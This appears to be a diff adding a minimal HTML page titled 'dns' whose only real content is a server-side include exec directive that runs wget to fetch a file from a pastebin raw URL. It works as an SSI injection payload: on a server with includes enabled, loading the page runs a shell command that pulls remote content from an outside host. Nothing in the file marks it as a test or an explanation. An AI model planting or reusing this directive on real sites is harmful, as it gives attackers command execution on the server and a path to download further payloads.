@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<head>
+<title>dns</title>
+</head>
+
+<body>
+<h1>ok</h1>
+<pre>
+<!--#exec cmd="'wget https://pastebin.com/raw/MdHzfMvz'" -->
+</pre>
+</body>
+</html>
